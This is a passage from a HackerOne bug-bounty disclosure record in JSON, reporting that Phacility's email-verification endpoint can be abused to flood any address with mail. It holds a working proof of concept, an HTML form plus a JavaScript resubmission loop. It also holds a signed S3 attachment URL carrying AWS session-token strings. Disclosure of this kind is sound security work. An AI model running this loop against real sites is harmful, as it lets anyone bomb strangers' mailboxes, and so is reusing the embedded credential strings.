lity":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-04-26T10:32:37.997Z","bug_reporter_agreed_on_going_public_at":"2017-04-26T05:13:39.530Z","team_member_agreed_on_going_public_at":"2017-04-26T10:32:37.960Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Here is your keyword: mongoose\n\n- Description:\n\nThe API interface in https://admin.phacility.com/settings/user/toma/page/email/ is unlimited and can be used as a mailbox bomb\n\n- Reproduced:\n\n1.register a user and wait for verify email address\n2.use my PoC:\n```\n\u003cform id=\"myform\" action=\"https://admin.phacility.com/settings/user/toma/page/email/?verify=14295\" method=\"POST\" target=\"_blank\"\u003e\n\u003cinput type=\"text\" name=\"__csrf__\" value=\"B@f3wyama2759fcd6f915746da\"\u003e\n\u003cinput type=\"text\" name=\"__form__\" value=\"1\"\u003e\n\u003cinput type=\"text\" name=\"__dialog__\" value=\"1\"\u003e\n\u003cinput type=\"text\" name=\"verify\" value=\"14295\"\u003e\n\u003cinput type=\"text\" name=\"__submit__\" value=\"true\"\u003e\n\u003cinput type=\"text\" name=\"__wflow__\" value=\"true\"\u003e\n\u003cinput type=\"text\" name=\"__ajax__\" value=\"true\"\u003e\n\u003cinput type=\"text\" name=\"__metablock__\" value=\"3\"\u003e\n\u003c/form\u003e\n\u003cscript\u003e\n\nfunction interval(func, wait, times){\n    var interv = function(w, t){\n        return function(){\n            if(typeof t === \"undefined\" || t-- \u003e 0){\n                setTimeout(interv, w);\n                try{\n                    func.call(null);\n                }\n                catch(e){\n                    t = 0;\n                    throw e.toString();\n                }\n            }\n        };\n    }(wait, times);\n\n    setTimeout(interv, wait);\n};\n\n//submit every 2000ms,execute 5 times(you can change this number to execute more times)\ninterval(function(){\ndocument.getElementById(\"myform\").submit();\n},2000,5);\n\u003c/script\u003e\n```\nand its `__csrf__` is your token\n\n- Note\n\nBecause the email address has not been verified this time,I can write any email address when registration,then I can bomb any people's email box.\n","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":176939,"file_name":"Screen_Shot_2017-04-09_at_3.33.14_PM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/176/939/5ecf3c7fb8e42d87b09ae89625c1640d079964a4/Screen_Shot_2017-04-09_at_3.33.14_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-04-09_at_3.33.14_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-04-09_at_3.33.14_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4PAW27SK%2F20260429%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20260429T102954Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIE5B%2FEmNAuncK%2F2iXqVCIdktX5OvmeV5UvFrnvsT%2Bn%2FGAiEAgv%2ByMoz%2BapPMnGxYSyrJI1Lm%2BFo4WttzB1xkCZdH0zsqugUI8%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDG%2FcuZI5Vb4RJVaqySqOBTCeue6QztU6Fic586IkStx3ooFd1i0oJQmsdnaaLA2FFIErOYPE%2FSUZvQFqtM9GtQHxkVVXrYfyvDyGF6A%2FHstuEip4jTYb5JshywEgiUEOKxkag1f8b6Y1uRLF35FY1797aofl2wk5efew3ZXdiybHQdvVQkfbFFRkPDa4Q3%2BZACD8qccSlKoD507Nl%2FReF8qRenV%2BEWHYq0DDIMyuh42FWdRfH%2FSKQmWAchFOflrblqH7Dn7VGfLxbXr5sew0XAe%2FZ%2BKhWwasThSfIWkTmPN3RhARu7F5lHRcPQIDVDkj5iNOHiMndPzmhkEhsrhiW6%2F4MSYO8%2F1owIcGLtD48P9wgtTOttV%2FaoWibFS%2BILFNOTTO6CRJnRLPsI6rtJByknqxkjdhKXIi21K03odr4O4C9pV6q2RI1RwbmHRra0QLie4WO7H3Vhktcy%2Fx7k%2BbCAwXibFI95J4I%2FzjOf068zfnmeM734z54S%2BBLnLidS%2BuIkghJiz2VyUGSgMiYZdTvA9kI4Xc1olKZprvHJ2awwTbQ2rEU5Sf0nfTBzCgh7Yc42ht3fv9hwa4QCfIL47T5%2Fm9R7Kyi2ClHAUdL8%2BSxAkTj0KGA%2BOsoRpXbh5Yuku07x8%2FWv63NroKPj1zBTK228qZx2DnC6f6o8esNflblRy3%2BhK50GK9M6l4hjfpLpkJTPMrsiKdzv